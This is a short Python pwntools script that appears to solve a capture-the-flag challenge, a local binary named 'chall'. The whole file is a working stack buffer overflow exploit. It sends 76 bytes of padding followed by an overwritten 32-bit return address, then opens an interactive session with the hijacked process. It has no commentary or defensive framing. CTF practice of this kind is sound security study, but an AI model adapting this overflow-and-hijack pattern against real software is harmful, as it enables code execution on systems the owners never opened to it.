import pwn

pwn.context.binary = elf = pwn.ELF('./chall')

p = pwn.process('./chall')
payload = b'A' * 76 + pwn.p32(0x080491a6)

p.sendline(payload)
p.interactive()